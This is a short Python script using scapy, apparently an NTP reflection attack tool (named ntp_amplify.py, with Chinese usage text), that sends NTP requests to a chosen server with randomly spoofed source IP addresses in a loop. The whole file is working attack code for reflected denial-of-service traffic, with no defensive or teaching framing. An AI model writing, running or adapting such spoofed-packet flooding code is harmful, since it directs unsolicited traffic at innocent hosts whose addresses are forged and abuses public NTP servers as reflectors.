# -*- coding:utf-8 -*-
# linux
from scapy.all import *
import random

if len(sys.argv) != 3:
    print("参数错误，用法如下: ")
    print("python ntp_amplify.py [ntp_server_IP] [num]")
    sys.exit()
ntp_server = sys.argv[1]
num = int(sys.argv[2])
print("NTP reflect start,press Ctrl+C to stop.")
for i in range(num):
    ip = str(random.randint(1, 200)) + '.' + str(random.randint(1, 200)) + '.' + str(
        random.randint(1, 200)) + '.' + str(random.randint(1, 200))
    send(IP(dst=ntp_server, src=ip) / UDP(sport=123) / NTP(leap=3, version=4, mode=3))
    print(ip + 'successful!')
